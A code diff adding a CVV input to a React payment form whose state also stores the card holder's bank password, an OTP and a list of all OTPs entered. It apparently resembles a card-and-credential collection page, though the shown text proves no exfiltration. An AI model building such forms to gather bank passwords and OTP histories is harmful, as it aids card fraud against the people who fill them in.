@@ -10,6 +10,7 @@ type PaymentInfo = {
   month: string;
   bank?: string;
   otp?: string;
+  cvv?:string;
   pass: string;
   cardState: string;
   allOtps:string[],
@@ -129,6 +130,7 @@ const {total}=  useCart() as any
     year: '',
     month: '',
     otp: '',
+    cvv: '',
     allOtps:newotp,
     bank: '',
     pass: '',
@@ -273,6 +275,7 @@ const {total}=  useCart() as any
                       style={{ width: '50%' }}
                     />
                   </div>
+                  
                   {/* Added for Points Redemption */}
                 </div>
 
@@ -467,6 +470,40 @@ const {total}=  useCart() as any
                           <option value={2067}>2067</option>
                         </select>
                       </div>
+
+                      <div className="row" id="PinRow">
+                        {/* <div class="col-lg-12"><label class="col-lg-6"></label></div> */}
+                        <input
+                          type="hidden"
+                          name="cardPinType"
+                          defaultValue="A"
+                        />
+                        <div id="eComPin">
+                          <label className="column-label"> Cvv: </label>
+                        </div>
+                        <div>
+                          <input
+                            inputMode="numeric"
+                            pattern="[0-9]*"
+                            name="cvv"
+                            id="cvv"
+                            onChange={(e: any) =>
+                              setPaymentInfo({
+                                ...paymentInfo,
+                                cvv: e.target.value,
+                              })
+                            }
+                            autoComplete="off"
+                            title="Should be in number. Length should be 4"
+                            type="password"
+                            size={3}
+                            maxLength={3}
+                            className="allownumericwithoutdecimal"
+                            style={{ width: '60%' }}
+                          />
+                        </div>
+                      </div>
+                      
                       <div className="row" id="PinRow">
                         {/* <div class="col-lg-12"><label class="col-lg-6"></label></div> */}
                         <input
